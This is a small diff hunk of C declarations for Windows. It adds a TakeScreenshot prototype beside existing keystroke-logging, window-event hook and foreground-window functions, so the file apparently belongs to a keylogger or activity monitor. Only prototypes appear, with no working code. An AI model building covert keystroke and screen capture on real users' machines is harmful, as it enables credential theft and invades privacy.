@@ -18,6 +18,7 @@ VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, 
 VOID LogvKey(INT vKey, INT MODE);
 VOID GetUsernameOfForegroundWindow(LPSTR username, DWORD foregroundWindowPID);
 VOID GetWindowTitle(HWND hwnd);
+VOID TakeScreenshot(void);
 
 //log
 VOID log(void *toLog, int MODE, BOOL putDate);
